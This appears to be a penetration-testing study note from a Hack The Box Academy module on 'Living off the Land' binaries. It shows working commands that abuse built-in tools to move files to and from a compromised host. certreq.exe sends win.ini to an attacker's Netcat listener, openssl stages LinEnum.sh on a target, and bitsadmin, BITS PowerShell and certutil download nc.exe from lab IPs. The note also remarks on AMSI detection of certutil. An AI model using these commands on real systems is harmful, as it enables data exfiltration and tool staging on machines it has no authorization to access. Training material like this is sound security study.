# Living off The Land
- [Living off The Land](#living-off-the-land)
  - [**Using the LOLBAS and GTFOBins Project**](#using-the-lolbas-and-gtfobins-project)
    - [**LOLBAS**](#lolbas)
    - [**Upload win.ini to our Pwnbox**](#upload-winini-to-our-pwnbox)
    - [**File Received in our Netcat Session**](#file-received-in-our-netcat-session)
    - [**GTFOBins**](#gtfobins)
    - [**Create Certificate in our Pwnbox**](#create-certificate-in-our-pwnbox)
    - [**Stand up the Server in our Pwnbox**](#stand-up-the-server-in-our-pwnbox)
    - [**Download File from the Compromised Machine**](#download-file-from-the-compromised-machine)
- [**Other Common Living off the Land tools**](#other-common-living-off-the-land-tools)
    - [**Bitsadmin Download function**](#bitsadmin-download-function)
    - [**File Download with Bitsadmin**](#file-download-with-bitsadmin)
    - [**Download**](#download)
    - [**Certutil**](#certutil)
    - [**Download a File with Certutil**](#download-a-file-with-certutil)

The phrase "Living off the land" was coined by Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) & Matt Graeber [@mattifestation](https://twitter.com/mattifestation) at [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).

The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows & Linux systems.

---

## **Using the LOLBAS and GTFOBins Project**

[LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins for Linux](https://gtfobins.github.io/) are websites where we can search for binaries we can use for different functions.

### **LOLBAS**

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.

![https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg](https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg)

Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.

We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

### **Upload win.ini to our Pwnbox**

```
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

This will send the file to our Netcat session, and we can copy-paste its contents.

### **File Received in our Netcat Session**

```
th1nyunb0y@htb[/htb]$ sudo nc -lvnp 8000listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

### **GTFOBins**

To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

![https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg](https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg)

Let's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

We need to create a certificate and start a server in our Pwnbox.

### **Create Certificate in our Pwnbox**

```
th1nyunb0y@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pemGenerating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

### **Stand up the Server in our Pwnbox**

```
th1nyunb0y@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Next, with the server running, we need to download the file from the compromised machine.

### **Download File from the Compromised Machine**

```
th1nyunb0y@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

---

# **Other Common Living off the Land tools**

### **Bitsadmin Download function**

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

### **File Download with Bitsadmin**

```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

### **Download**

```powershell
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

---

### **Certutil**

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

### **Download a File with Certutil**

```
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```